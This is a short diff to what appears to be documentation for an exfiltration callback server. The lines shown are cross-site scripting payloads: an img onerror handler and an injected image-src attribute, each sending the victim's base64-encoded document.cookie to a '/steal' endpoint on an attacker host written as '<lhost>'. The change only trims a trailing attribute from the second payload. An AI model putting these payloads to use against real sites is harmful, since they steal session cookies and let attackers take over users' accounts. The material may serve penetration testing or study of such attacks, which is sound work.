@@ -167,7 +167,7 @@ GET callbacks store query params in `EXFIL_DATA[path]`. POST callbacks parse JSO
 <img src=x onerror="fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))">
 
 // Injected into an image src field
-data:image/jpeg;base64,<base64_jpeg_header>' onerror=fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie)) usemap='#w
+data:image/jpeg;base64,<base64_jpeg_header>' onerror=fetch('http://<lhost>/steal?b64_cookie='+btoa(document.cookie))
 ```
 
 ---
